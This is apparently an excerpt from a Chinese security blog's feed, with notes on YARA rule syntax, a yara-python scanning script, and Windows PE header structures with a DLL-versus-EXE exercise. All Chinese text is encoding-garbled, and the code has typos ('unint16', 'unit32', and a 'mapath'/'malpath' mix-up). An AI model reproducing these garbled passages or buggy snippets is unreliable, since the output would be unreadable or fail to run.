<h4 id="Yaraè§„åˆ™å¸¸ç”¨ä¿®é¥°ç¬¦"><a href="#Yaraè§„åˆ™å¸¸ç”¨ä¿®é¥°ç¬¦" class="headerlink" title="Yaraè§„åˆ™å¸¸ç”¨ä¿®é¥°ç¬¦"></a>Yaraè§„åˆ™å¸¸ç”¨ä¿®é¥°ç¬¦</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nocaseï¼šä¸åŒºåˆ†å¤§å°å†™</span><br><span class="line">base64ï¼šbase64å­—ç¬¦ä¸²</span><br><span class="line">xorï¼šå¼‚æˆ–å­—ç¬¦ä¸²</span><br><span class="line">wideï¼šå®½å­—ç¬¦</span><br></pre></td></tr></table></figure>

<h4 id="Yaraè§„åˆ™æ¡ä»¶"><a href="#Yaraè§„åˆ™æ¡ä»¶" class="headerlink" title="Yaraè§„åˆ™æ¡ä»¶"></a>Yaraè§„åˆ™æ¡ä»¶</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># å¸ƒå°”è¿ç®—</span><br><span class="line">andï¼šä¸   orï¼šæˆ–   notï¼šé</span><br><span class="line">all of themï¼š         //åŒ¹é…æ‰€æœ‰æ¡ä»¶å³å‘Šè­¦</span><br><span class="line">any of themï¼š         //åŒ¹é…åˆ°å…¶ä¸­ä¸€ä¸ªæ¡ä»¶å³å‘Šè­¦</span><br><span class="line">$a and $b and $cï¼š    //åŒæ—¶åŒ¹é…åˆ°abcå³å‘Šè­¦</span><br><span class="line">($a and $b) or $cï¼š   //åŒ¹é…åˆ°aå’Œbæˆ–cå³å‘Šè­¦</span><br><span class="line">$a and $b and $cï¼š    //åŒæ—¶åŒ¹é…åˆ°abcå³å‘Šè­¦</span><br><span class="line">($a and $b) or $cï¼š   //åŒ¹é…åˆ°aå’Œbæˆ–cå³å‘Šè­¦</span><br><span class="line"></span><br><span class="line"># æ–‡ä»¶å¤§å°</span><br><span class="line">filesize &gt; 200KB</span><br><span class="line"></span><br><span class="line"># è®¿é—®æŒ‡å®šä½ç½®æ•°æ®</span><br><span class="line">unint16(0) and unit32(unit32(0x3c)) == 0x00004550</span><br></pre></td></tr></table></figure>

<h4 id="Yaraç¼–å†™"><a href="#Yaraç¼–å†™" class="headerlink" title="Yaraç¼–å†™"></a>Yaraç¼–å†™</h4><p>å…ˆç•¥è¿‡ åç»­æœ‰æ—¶é—´å†æä¸€ä¸‹</p>
<br>

<h3 id="ä½¿ç”¨"><a href="#ä½¿ç”¨" class="headerlink" title="ä½¿ç”¨"></a>ä½¿ç”¨</h3><p><code>pip install yara-python</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> yara</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="comment"># è·å–ç›®å½•å†…çš„yaraè§„åˆ™æ–‡ä»¶</span></span><br><span class="line"><span class="comment"># å°†yaraè§„åˆ™ç¼–è¯‘</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getRules</span>(<span class="params">path</span>):</span><br><span class="line">  filepath = &#123;&#125;</span><br><span class="line">  <span class="keyword">for</span> index, file <span class="keyword">in</span> <span class="built_in">enumerate</span>(os.listdir(path)):</span><br><span class="line">    rupath = os.path.join(path, file)</span><br><span class="line">    key = <span class="string">&quot;rule&quot;</span> + <span class="built_in">str</span>(index)</span><br><span class="line">    filepath[key] = rupath</span><br><span class="line">    <span class="built_in">print</span>(rupath)</span><br><span class="line">    </span><br><span class="line">  yararule = yara.<span class="built_in">compile</span>(filepaths=filepath)</span><br><span class="line">  <span class="built_in">print</span>(filepath)</span><br><span class="line">  <span class="built_in">print</span>(yararule)</span><br><span class="line">  <span class="keyword">return</span> yararule</span><br><span class="line">  </span><br><span class="line"><span class="comment"># æ‰«æå‡½æ•°</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">scan</span>(<span class="params">rule, path</span>):</span><br><span class="line">  <span class="keyword">for</span> file <span class="keyword">in</span> os.listdir(path):</span><br><span class="line">    mapath = os.path.join(path, file)</span><br><span class="line">    <span class="built_in">print</span> (malpath+<span class="string">&quot;\\&quot;</span>+file)</span><br><span class="line">    fp = <span class="built_in">open</span>(malpath+<span class="string">&quot;\\&quot;</span>+file, <span class="string">&#x27;rb&#x27;</span>)</span><br><span class="line">    matches = rule.<span class="keyword">match</span>(data=fp.read())</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(matches) &gt; <span class="number">0</span>:</span><br><span class="line">      <span class="built_in">print</span> (file, matches)</span><br><span class="line">      </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">  rulepath = <span class="string">&quot;F:\\yara\\rules&quot;</span> <span class="comment"># yaraè§„åˆ™ç›®å½•</span></span><br><span class="line">  malpath =<span class="string">&quot;F:\\yara\\samples&quot;</span> <span class="comment"># simpleç›®å½•</span></span><br><span class="line">  <span class="comment"># yaraè§„åˆ™ç¼–è¯‘å‡½æ•°è°ƒç”¨</span></span><br><span class="line">  yararule = getRules(rulepath)</span><br><span class="line">  <span class="comment"># æ‰«æå‡½æ•°è°ƒç”¨</span></span><br><span class="line">  scan(yararule, malpath)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<br>

<h3 id="References"><a href="#References" class="headerlink" title="References"></a>References</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://lengjibo.github.io/yara/</span><br><span class="line">https://zhuanlan.kanxue.com/article-17369.htm</span><br><span class="line">https://toutiao.io/posts/05scc8/preview</span><br></pre></td></tr></table></figure>
]]></content>
  </entry>
  <entry>
    <title>PEç»“æ„å­¦ä¹ </title>
    <url>/posts/d8527941/</url>
    <content><![CDATA[<h3 id="PEæ–‡ä»¶ç»“æ„"><a href="#PEæ–‡ä»¶ç»“æ„" class="headerlink" title="PEæ–‡ä»¶ç»“æ„"></a>PEæ–‡ä»¶ç»“æ„</h3><h4 id="1-å¯æ‰§è¡Œæ–‡ä»¶"><a href="#1-å¯æ‰§è¡Œæ–‡ä»¶" class="headerlink" title="1.å¯æ‰§è¡Œæ–‡ä»¶"></a>1.å¯æ‰§è¡Œæ–‡ä»¶</h4><p>åœ¨windowså¹³å°ä¸‹çš„å¯æ‰§è¡Œæ–‡ä»¶çš„æ ¼å¼ï¼Œæˆä¸ºPEæ–‡ä»¶ç»“æ„ï¼ˆPortable Executableï¼‰ï¼›</p>
<p>åœ¨Linuxå¹³å°ä¸‹çš„å¯æ‰§è¡Œæ–‡ä»¶æ ¼å¼æˆä¸ºELFæ–‡ä»¶ç»“æ„ï¼ˆExecutable and Linking Formatï¼‰</p>
<br>

<h4 id="2-PEæŒ‡çº¹"><a href="#2-PEæŒ‡çº¹" class="headerlink" title="2.PEæŒ‡çº¹"></a>2.PEæŒ‡çº¹</h4><p>åœ¨åˆå§‹ä½ç½®ä¸º 4D 5A ï¼ˆåè¿›åˆ¶ä¸ºMZï¼‰ è€Œåœ¨0x3cå æœ‰ä¸€ä¸ª0x0100hï¼ˆï¼‰ æŒ‡å‘0x0100hï¼ˆPEï¼‰å¤„</p>
<p><img src="/posts/d8527941/1.png"></p>
<br>

<h4 id="3-PEæ•´ä½“ç»“æ„"><a href="#3-PEæ•´ä½“ç»“æ„" class="headerlink" title="3.PEæ•´ä½“ç»“æ„"></a>3.PEæ•´ä½“ç»“æ„</h4><p>ä¸‹å›¾æ˜¯åœ¨githubä¸Šå¤§ä½¬æ»´æ°´çš„å­¦ä¹ ç¬”è®°ä¸Šæˆªçš„</p>
<p><img src="/posts/d8527941/2.png"></p>
<p><img src="/posts/d8527941/3.png"></p>
<br>

<p>åœ¨visual studioä¸­ å¯ä»¥è°ƒç”¨ &lt;windows.h&gt;å»æŸ¥çœ‹PEçš„ç»“æ„ä½“</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include &lt;windows.h&gt;</span><br><span class="line">_IMAGE_DOS_HEADER;</span><br><span class="line">_IMAGE_NT_HEADERS;</span><br><span class="line">_IMAGE_SECTION_HEADER</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>å…¶ä¸­WORDç±»å‹ å 2å­—èŠ‚ï¼›DOWRDç±»å‹ å 4ä¸ªå­—èŠ‚ï¼›BYTEç±»å‹ å 1ä¸ªå­—èŠ‚</p>
<p>ä¹Ÿå¯ä»¥è°ƒç”¨pythonä¸­çš„<code>pefile</code>åº“æŸ¥çœ‹peæ–‡ä»¶ç»“æ„ (pip install pefile)</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pefile</span><br><span class="line"></span><br><span class="line">pe = pefile.PE(<span class="string">&#x27;1.exe&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(pe)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="/posts/d8527941/4.png"></p>
<br>

<h4 id="4-PEæ–‡ä»¶æ•´ä½“ç»“æ„è§£æ"><a href="#4-PEæ–‡ä»¶æ•´ä½“ç»“æ„è§£æ" class="headerlink" title="4.PEæ–‡ä»¶æ•´ä½“ç»“æ„è§£æ"></a>4.PEæ–‡ä»¶æ•´ä½“ç»“æ„è§£æ</h4><h5 id="4-1-DOSå¤´"><a href="#4-1-DOSå¤´" class="headerlink" title="4.1 DOSå¤´"></a>4.1 DOSå¤´</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">typedef struct _IMAGE_DOS_HEADER &#123;      // DOS .EXE header</span><br><span class="line">    WORD   e_magic;                     // Magic number</span><br><span class="line">    WORD   e_cblp;                      // Bytes on last page of file</span><br><span class="line">    WORD   e_cp;                        // Pages in file</span><br><span class="line">    WORD   e_crlc;                      // Relocations</span><br><span class="line">    WORD   e_cparhdr;                   // Size of header in paragraphs</span><br><span class="line">    WORD   e_minalloc;                  // Minimum extra paragraphs needed</span><br><span class="line">    WORD   e_maxalloc;                  // Maximum extra paragraphs needed</span><br><span class="line">    WORD   e_ss;                        // Initial (relative) SS value</span><br><span class="line">    WORD   e_sp;                        // Initial SP value</span><br><span class="line">    WORD   e_csum;                      // Checksum</span><br><span class="line">    WORD   e_ip;                        // Initial IP value</span><br><span class="line">    WORD   e_cs;                        // Initial (relative) CS value</span><br><span class="line">    WORD   e_lfarlc;                    // File address of relocation table</span><br><span class="line">    WORD   e_ovno;                      // Overlay number</span><br><span class="line">    WORD   e_res[4];                    // Reserved words</span><br><span class="line">    WORD   e_oemid;                     // OEM identifier (for e_oeminfo)</span><br><span class="line">    WORD   e_oeminfo;                   // OEM information; e_oemid specific</span><br><span class="line">    WORD   e_res2[10];                  // Reserved words</span><br><span class="line">    LONG   e_lfanew;                    // File address of new exe header</span><br><span class="line">  &#125; IMAGE_DOS_HEADER, *PIMAGE_DOS_HEADER;</span><br></pre></td></tr></table></figure>

<p> WORD   e_magic;                         // Magic number æ ‡å¿—ä½(MZ 4D5A å 2ä¸ªå­—èŠ‚)</p>
<p>Long  e_lfanew;                            // File address of new exe header åç§»ä½ç½®ï¼ˆæŒ‡å‘ä¸‹ä¸€ä¸ªæ–‡ä»¶å‰é¢ï¼‰</p>
<br>

<h5 id="4-2-PE-NT-æ–‡ä»¶å¤´"><a href="#4-2-PE-NT-æ–‡ä»¶å¤´" class="headerlink" title="4.2 PE(NT)æ–‡ä»¶å¤´"></a>4.2 PE(NT)æ–‡ä»¶å¤´</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">typedef struct _IMAGE_NT_HEADERS &#123;</span><br><span class="line">    DWORD Signature;                        //PEæ ‡è¯†</span><br><span class="line">    IMAGE_FILE_HEADER FileHeader;           //æ ‡å‡†PEå¤´</span><br><span class="line">    IMAGE_OPTIONAL_HEADER32 OptionalHeader; //æ‹“å±•PEå¤´</span><br><span class="line">&#125; IMAGE_NT_HEADERS32, *PIMAGE_NT_HEADERS32;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>ç¬¬ä¸€éƒ¨åˆ†ä¸ºPEæ–‡ä»¶å¤´æ ‡å¿—ï¼Œ<code>DWORD Signature;</code> ï¼ˆ50450000 dowrdå 4ä¸ªå­—èŠ‚ï¼‰</p>
<h6 id="4-2-1-æ ‡å‡†PEå¤´"><a href="#4-2-1-æ ‡å‡†PEå¤´" class="headerlink" title="4.2.1 æ ‡å‡†PEå¤´"></a>4.2.1 æ ‡å‡†PEå¤´</h6><p>ç¬¬äºŒéƒ¨åˆ†ä¸º<code>IMAGE_FILE_HEADER</code> å 20å­—èŠ‚ ç§°ä¹‹ä¸ºæ ‡å‡†PEå¤´</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">typedef struct _IMAGE_FILE_HEADER &#123;</span><br><span class="line">    WORD    Machine;                      //è¯†åˆ«CPU</span><br><span class="line">    WORD    NumberOfSections;             //è¡¨ç¤ºèŠ‚çš„æ•°é‡</span><br><span class="line">    DWORD   TimeDateStamp;                //æ—¶é—´æˆ³</span><br><span class="line">    DWORD   PointerToSymbolTable;         //è°ƒè¯•ç›¸å…³</span><br><span class="line">    DWORD   NumberOfSymbols;              //è°ƒè¯•ç›¸å…³</span><br><span class="line">    WORD    SizeOfOptionalHeader;         //æ‹“å±•PEå¤´çš„å¤§å°</span><br><span class="line">    WORD    Characteristics;              //æ–‡ä»¶å±æ€§</span><br><span class="line">&#125; IMAGE_FILE_HEADER, *PIMAGE_FILE_HEADER; </span><br></pre></td></tr></table></figure>

<p>ç¬¬ä¸€ä¸ªæˆå‘˜ <code>WORD Machine</code> CPUè¯†åˆ«</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#define IMAGE_FILE_MACHINE_UNKNOWN 0</span><br><span class="line">#define IMAGE_FILE_MACHINE_TARGET_HOST 0x0001 // Useful for indicating we want to interact with the host and not a WoW guest.</span><br><span class="line">#define IMAGE_FILE_MACHINE_I386 0x014c // Intel 386.</span><br><span class="line">#define IMAGE_FILE_MACHINE_R3000 0x0162 // MIPS little-endian,</span><br><span class="line">0x160 big-endian</span><br><span class="line">#define IMAGE_FILE_MACHINE_R4000 0x0166 // MIPS little-endian</span><br><span class="line">#define IMAGE_FILE_MACHINE_R10000 0x0168 // MIPS little-endian</span><br><span class="line">#define IMAGE_FILE_MACHINE_WCEMIPSV2 0x0169 // MIPS little-endian WCEv2</span><br><span class="line">#define IMAGE_FILE_MACHINE_ALPHA 0x0184 // Alpha_AXP</span><br><span class="line">#define IMAGE_FILE_MACHINE_SH3 0x01a2 // SH3 little-endian</span><br><span class="line">#define IMAGE_FILE_MACHINE_SH3DSP 0x01a3</span><br><span class="line">#define IMAGE_FILE_MACHINE_SH3E 0x01a4 // SH3E little-endian</span><br><span class="line">#define IMAGE_FILE_MACHINE_SH4 0x01a6 // SH4 little-endian</span><br><span class="line">#define IMAGE_FILE_MACHINE_SH5 0x01a8 // SH5</span><br><span class="line">#define IMAGE_FILE_MACHINE_ARM 0x01c0 // ARM Little-Endian</span><br><span class="line">#define IMAGE_FILE_MACHINE_THUMB 0x01c2 // ARM Thumb/Thumb-2Little-Endian</span><br><span class="line">#define IMAGE_FILE_MACHINE_ARMNT 0x01c4 // ARM Thumb-2 LittleEndian</span><br><span class="line">#define IMAGE_FILE_MACHINE_AM33 0x01d3</span><br><span class="line">#define IMAGE_FILE_MACHINE_POWERPC 0x01F0 // IBM PowerPC LittleEndian</span><br><span class="line">#define IMAGE_FILE_MACHINE_POWERPCFP 0x01f1</span><br><span class="line">#define IMAGE_FILE_MACHINE_IA64 0x0200 // Intel 64</span><br><span class="line">#define IMAGE_FILE_MACHINE_MIPS16 0x0266 // MIPS</span><br><span class="line">#define IMAGE_FILE_MACHINE_ALPHA64 0x0284 // ALPHA64</span><br><span class="line">#define IMAGE_FILE_MACHINE_MIPSFPU 0x0366 // MIPS</span><br><span class="line">#define IMAGE_FILE_MACHINE_MIPSFPU16 0x0466 // MIPS</span><br><span class="line">#define IMAGE_FILE_MACHINE_AXP64 IMAGE_FILE_MACHINE_ALPHA64</span><br><span class="line">#define IMAGE_FILE_MACHINE_TRICORE 0x0520 // Infineon</span><br><span class="line">#define IMAGE_FILE_MACHINE_CEF 0x0CEF</span><br><span class="line">#define IMAGE_FILE_MACHINE_EBC 0x0EBC // EFI Byte Code</span><br><span class="line">#define IMAGE_FILE_MACHINE_AMD64 0x8664 // AMD64 (K8)</span><br><span class="line">#define IMAGE_FILE_MACHINE_M32R 0x9041 // M32R little-endian</span><br><span class="line">#define IMAGE_FILE_MACHINE_ARM64 0xAA64 // ARM64 Little-Endian</span><br><span class="line">#define IMAGE_FILE_MACHINE_CEE 0xC0EE</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>ç¬¬äºŒä¸ªæˆå‘˜ <code>WORD NumberOfSections</code> è¡¨ç¤ºå½“å‰PEæ–‡ä»¶ä¸­èŠ‚çš„æ•°é‡</p>
<p>ç¬¬ä¸‰ä¸ªæˆå‘˜<code>DWORD TimeDateStamp</code>    è¡¨ç¤ºç¼–è¯‘å™¨ç¼–è¯‘æ—¶çš„æ—¶é—´æˆ³</p>
<p>ç¬¬å››ä¸ªæˆå‘˜<code>DWORD PointerToSymbolTable</code> å’Œç¬¬äº”ä¸ªæˆå‘˜<code>DWORD NumberOfSymbols</code>ä¸ºè°ƒè¯•ç›¸å…³æš‚ä¸å»äº†è§£</p>
<p>ç¬¬å…­ä¸ªæˆå‘˜<code>WORD SizeOfOptionalHeader</code> è¡¨ç¤ºPEæ‹“å±•å¤´çš„å¤§å°</p>
<p>ç¬¬ä¸ƒä¸ªæˆå‘˜<code>WORD Characteristics;</code> è¡¨ç¤ºå½“å‰PEæ–‡ä»¶å±æ€§</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#define IMAGE_FILE_RELOCS_STRIPPED           0x0001  // Relocation info stripped from file.</span><br><span class="line">#define IMAGE_FILE_EXECUTABLE_IMAGE          0x0002  // File is executable  (i.e. no unresolved external references).</span><br><span class="line">#define IMAGE_FILE_LINE_NUMS_STRIPPED        0x0004  // Line nunbers stripped from file.</span><br><span class="line">#define IMAGE_FILE_LOCAL_SYMS_STRIPPED       0x0008  // Local symbols stripped from file.</span><br><span class="line">#define IMAGE_FILE_AGGRESIVE_WS_TRIM         0x0010  // Aggressively trim working set</span><br><span class="line">#define IMAGE_FILE_LARGE_ADDRESS_AWARE       0x0020  // App can handle &gt;2gb addresses</span><br><span class="line">#define IMAGE_FILE_BYTES_REVERSED_LO         0x0080  // Bytes of machine word are reversed.</span><br><span class="line">#define IMAGE_FILE_32BIT_MACHINE             0x0100  // 32 bit word machine.</span><br><span class="line">#define IMAGE_FILE_DEBUG_STRIPPED            0x0200  // Debugging info stripped from file in .DBG file</span><br><span class="line">#define IMAGE_FILE_REMOVABLE_RUN_FROM_SWAP   0x0400  // If Image is on removable media, copy and run from the swap file.</span><br><span class="line">#define IMAGE_FILE_NET_RUN_FROM_SWAP         0x0800  // If Image is on Net, copy and run from the swap file.</span><br><span class="line">#define IMAGE_FILE_SYSTEM                    0x1000  // System File.</span><br><span class="line">#define IMAGE_FILE_DLL                       0x2000  // File is a DLL.</span><br><span class="line">#define IMAGE_FILE_UP_SYSTEM_ONLY            0x4000  // File should only be run on a UP machine</span><br><span class="line">#define IMAGE_FILE_BYTES_REVERSED_HI         0x8000  // Bytes of machine word are reversed.</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<br>

<h6 id="4-2-2-æ‹“å±•PEå¤´"><a href="#4-2-2-æ‹“å±•PEå¤´" class="headerlink" title="4.2.2 æ‹“å±•PEå¤´"></a>4.2.2 æ‹“å±•PEå¤´</h6><p>ç¬¬ä¸‰éƒ¨åˆ†ä¸º<code>_IMAGE_OPTIONAL_HEADER</code> PEå¯é€‰å¤´ï¼Œåœ¨32ä½ä¸‹æ˜¯224å­—èŠ‚ï¼Œåœ¨64ä½ä¸‹æ˜¯240å­—èŠ‚,ä¸‹é¢ä½32ä½ä¸‹çš„æ‹“å±•PEå¤´</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">typedef struct _IMAGE_OPTIONAL_HEADER &#123;</span><br><span class="line">    //</span><br><span class="line">    // Standard fields.</span><br><span class="line">    //</span><br><span class="line">    WORD    Magic;                  //æ–‡ä»¶ç±»å‹æ ‡è¯†  0x10B 32ä½é•œåƒæ–‡ä»¶ 0x20B;0x107 ROMé•œåƒ ;64ä½é•œåƒæ–‡ä»¶</span><br><span class="line">    BYTE    MajorLinkerVersion;</span><br><span class="line">    BYTE    MinorLinkerVersion;</span><br><span class="line">    DWORD   SizeOfCode;             // .textæ€»å¤§å°</span><br><span class="line">    DWORD   SizeOfInitializedData;  // .dataæ€»å¤§å°</span><br><span class="line">    DWORD   SizeOfUninitializedData;// .bssæ€»å¤§å°</span><br><span class="line">    DWORD   AddressOfEntryPoint;    // ç¨‹åºè™šæ‹Ÿå…¥å£åœ°å€</span><br><span class="line">    DWORD   BaseOfCode;             // ä»£ç åŸºå€</span><br><span class="line">    DWORD   BaseOfData;             // æ•°æ®åŸºå€</span><br><span class="line">    //</span><br><span class="line">    // NT additional fields.</span><br><span class="line">    //</span><br><span class="line">    DWORD   ImageBase;              // ç¨‹åºå…¥å£   dllé»˜è®¤æ˜¯10000000h windwos ceçš„exeé»˜è®¤æ˜¯00010000h windowsç³»åˆ—exeé»˜è®¤æ˜¯004000000h</span><br><span class="line">    DWORD   SectionAlignment;       // å†…å­˜å¯¹é½</span><br><span class="line">    DWORD   FileAlignment;          // æ–‡ä»¶å¯¹é½</span><br><span class="line">    WORD    MajorOperatingSystemVersion;</span><br><span class="line">    WORD    MinorOperatingSystemVersion;</span><br><span class="line">    WORD    MajorImageVersion;</span><br><span class="line">    WORD    MinorImageVersion;</span><br><span class="line">    WORD    MajorSubsystemVersion;</span><br><span class="line">    WORD    MinorSubsystemVersion;</span><br><span class="line">    DWORD   Win32VersionValue;      </span><br><span class="line">    DWORD   SizeOfImage;            // PEæ€»å¤§å°</span><br><span class="line">    DWORD   SizeOfHeaders;          // å¤´çš„æ€»å¤§å°</span><br><span class="line">    DWORD   CheckSum;               // æ ¡éªŒå’Œ(ç”¨äºæ£€æµ‹æ–‡ä»¶æ˜¯å¦è¢«ä¿®æ”¹)</span><br><span class="line">    WORD    Subsystem;              </span><br><span class="line">    WORD    DllCharacteristics;     //dllæ–‡ä»¶ç‰¹æ€§</span><br><span class="line">    DWORD   SizeOfStackReserve;</span><br><span class="line">    DWORD   SizeOfStackCommit;</span><br><span class="line">    DWORD   SizeOfHeapReserve;</span><br><span class="line">    DWORD   SizeOfHeapCommit;</span><br><span class="line">    DWORD   LoaderFlags;</span><br><span class="line">    DWORD   NumberOfRvaAndSizes;</span><br><span class="line">    IMAGE_DATA_DIRECTORY DataDirectory[IMAGE_NUMBEROF_DIRECTORY_ENTRIES];</span><br><span class="line">&#125; IMAGE_OPTIONAL_HEADER32, *PIMAGE_OPTIONAL_HEADER32;</span><br></pre></td></tr></table></figure>

<p>WORD Magic;æ–‡ä»¶ç±»å‹æ ‡è¯†</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0x10Bè¡¨æ˜è¿™æ˜¯ä¸€ä¸ª32ä½é•œåƒæ–‡ä»¶ã€‚</span><br><span class="line">0x107è¡¨æ˜è¿™æ˜¯ä¸€ä¸ªROMé•œåƒã€‚</span><br><span class="line">0x20Bè¡¨æ˜è¿™æ˜¯ä¸€ä¸ª64ä½é•œåƒæ–‡ä»¶ã€‚</span><br></pre></td></tr></table></figure>

<p><code>BYTE MajorLinkerVersion;</code> é“¾æ¥å™¨ä¸»ç‰ˆæœ¬å·ï¼ˆBYTE 2ä½16ï¼‰ </p>
<p><code>BYTE MinorLinkerVersion;</code> é“¾æ¥å™¨å‰¯ç‰ˆæœ¬å· </p>
<p><code>DWORD SizeOfCode;</code> .textæ€»å¤§å° </p>
<p><code>DWORD SizeOfInitializedData;</code> .dataæ€»å¤§å° </p>
<p><code>DWORD SizeOfUninitializedData;</code> .bssæ€»å¤§å° </p>
<p>bssï¼šBSSæ®µé€šå¸¸æ˜¯æŒ‡ç”¨æ¥å­˜æ”¾ç¨‹åºä¸­æœªåˆå§‹åŒ–çš„æˆ–è€…åˆå§‹åŒ–ä¸º0çš„å…¨å±€å˜é‡å’Œé™æ€å˜é‡çš„ä¸€å—å†…å­˜åŒºåŸŸã€‚ç‰¹ç‚¹æ˜¯å¯è¯»å†™çš„ï¼Œåœ¨ç¨‹åºæ‰§è¡Œä¹‹å‰BSSæ®µä¼šè‡ªåŠ¨æ¸…0ã€‚</p>
<br>

<p><code>WORD  DllCharacteristics; </code> PEæ–‡ä»¶ç‰¹æ€§</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#define IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE 0x0040     // DLL can move.</span><br><span class="line">#define IMAGE_DLLCHARACTERISTICS_FORCE_INTEGRITY    0x0080     // Code Integrity Image</span><br><span class="line">#define IMAGE_DLLCHARACTERISTICS_NX_COMPAT    0x0100     // Image is NX compatible</span><br><span class="line">#define IMAGE_DLLCHARACTERISTICS_NO_ISOLATION 0x0200     // Image understands isolation and doesn&#x27;t want it</span><br><span class="line">#define IMAGE_DLLCHARACTERISTICS_NO_SEH       0x0400     // Image does not use SEH.  No SE handler may reside in this image</span><br><span class="line">//sehçš„ä¿æŠ¤æœºåˆ¶</span><br><span class="line">#define IMAGE_DLLCHARACTERISTICS_NO_BIND      0x0800     // Do not bind this image.</span><br><span class="line">#define IMAGE_DLLCHARACTERISTICS_APPCONTAINER 0x1000     // Image should execute in an AppContainer</span><br><span class="line">#define IMAGE_DLLCHARACTERISTICS_WDM_DRIVER   0x2000     // Driver uses WDM model</span><br><span class="line">#define IMAGE_DLLCHARACTERISTICS_GUARD_CF     0x4000     // Image supports Control Flow Guard.</span><br><span class="line">#define IMAGE_DLLCHARACTERISTICS_TERMINAL_SERVER_AWARE     0x8000</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<br>

<h4 id="4-3-PEèŠ‚è¡¨"><a href="#4-3-PEèŠ‚è¡¨" class="headerlink" title="4.3 PEèŠ‚è¡¨"></a>4.3 PEèŠ‚è¡¨</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">typedef struct _IMAGE_SECTION_HEADER &#123;</span><br><span class="line">    BYTE    Name[IMAGE_SIZEOF_SHORT_NAME];    //èŠ‚å</span><br><span class="line">    union &#123; //äºŒé€‰ä¸€ é€šå¸¸é€‰åè€…ï¼ŒéŸ³ä¹ä¸çŸ¥é“å…·ä½“ç‰©ç†åœ°å€</span><br><span class="line">            DWORD   PhysicalAddress;          //æœ¬èŠ‚ç‰©ç†åœ°å€</span><br><span class="line">            DWORD   VirtualSize;              //æœ¬èŠ‚å®é™…å¤§å°  </span><br><span class="line">    &#125; Misc;</span><br><span class="line">    DWORD   VirtualAddress;                   //åœ¨å†…å­˜ä¸­çš„åç§»åœ°å€  åŠ ä¸ŠImageBaseæ‰æ˜¯å†…å­˜çš„çœŸæ­£åœ°å€</span><br><span class="line">    DWORD   SizeOfRawData;                    //æœ¬èŠ‚åœ¨ç£ç›˜ä¸­çš„å¤§å°</span><br><span class="line">    DWORD   PointerToRawData;                 //æœ¬èŠ‚åœ¨ç£ç›˜ä¸­çš„åç§»é‡</span><br><span class="line">    DWORD   PointerToRelocations;</span><br><span class="line">    DWORD   PointerToLinenumbers;</span><br><span class="line">    WORD    NumberOfRelocations;</span><br><span class="line">    WORD    NumberOfLinenumbers;</span><br><span class="line">    DWORD   Characteristics;                  //èŠ‚çš„å±æ€§</span><br><span class="line">&#125; IMAGE_SECTION_HEADER, *PIMAGE_SECTION_HEADER;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<br>

<br>

<p>â€¦. </p>
<br>

<br>

<br>

<h4 id="ç»ƒä¹ "><a href="#ç»ƒä¹ " class="headerlink" title="ç»ƒä¹ "></a>ç»ƒä¹ </h4><h5 id="1-åˆ¤æ–­æ ·æœ¬ä¸ºdllè¿˜æ˜¯exe"><a href="#1-åˆ¤æ–­æ ·æœ¬ä¸ºdllè¿˜æ˜¯exe" class="headerlink" title="1.åˆ¤æ–­æ ·æœ¬ä¸ºdllè¿˜æ˜¯exe"></a>1.åˆ¤æ–­æ ·æœ¬ä¸ºdllè¿˜æ˜¯exe</h5><p>æ ·æœ¬3çš„æ–‡ä»¶ç‰¹å¾ä½ 0x2102 æ ¹æ®æ–‡ä»¶ç‰¹å¾è¡¨  0x2000ï¼ˆdllï¼‰+0x0100(32ä½)+0x0002ï¼ˆå¯æ‰§è¡Œæ–‡ä»¶ï¼‰ </p>
<p>è¯´æ˜è¯¥æ–‡ä»¶ä¸ºä¸€ä¸ªå¯æ‰§è¡Œçš„32ä½dllæ–‡ä»¶</p>
<p><img src="/posts/d8527941/5.png"></p>
<p>æ ·æœ¬4çš„æ–‡ä»¶ç‰¹å¾ä¸º0x0103 å³(0x0100+ 0x0002+0x0001) è¯´æ˜æ˜¯ä¸€ä¸ª32ä½å¯æ‰§è¡Œçš„exe</p>
<p><img src="/posts/d8527941/6.png"></p>
<p>å› æ­¤å¯ä»¥åˆ¤æ–­æ ·æœ¬3ä¸ºdllæ–‡ä»¶ï¼Œæ ·æœ¬4ä¸ºexeæ–‡ä»¶ï¼ˆå¦‚æœä¸ºXX 01å°±æ˜¯ä¸€ä¸ªexeæ–‡ä»¶ï¼Œå¦‚æœæ˜¯XX 2Xè¯´æ˜æ˜¯dllæ–‡ä»¶ï¼‰</p>
